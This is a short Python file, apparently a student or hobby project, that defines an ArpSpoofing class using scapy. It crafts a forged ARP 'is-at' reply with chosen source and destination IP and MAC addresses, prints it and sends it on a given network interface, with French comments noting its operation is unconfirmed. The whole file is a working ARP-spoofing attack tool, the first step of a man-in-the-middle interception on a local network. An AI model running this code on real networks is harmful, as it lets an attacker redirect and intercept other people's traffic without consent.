import scapy.all as scapy

class ArpSpoofing:
    def __init__(self, ip_src, ip_dst, mac_src, mac_dst, interface):
        self.ip_src = ip_src
        self.mac_src = mac_src
        self.ip_dst = ip_dst
        self.mac_dst = mac_dst
        self.interface = interface

    def start_spoofing(self):
        pass
        # Créer un paquet ARP de type "is-at" (op=2) et l'envoyer
        # Fonctionnement à confirmer
        packet = scapy.ARP(op=2)
        packet.hwsrc = self.mac_src
        packet.hwdst=self.mac_dst
        packet.psrc=self.ip_src
        packet.pdst=self.ip_dst
        print(packet.show())
        scapy.send(packet, iface=self.interface, verbose=False)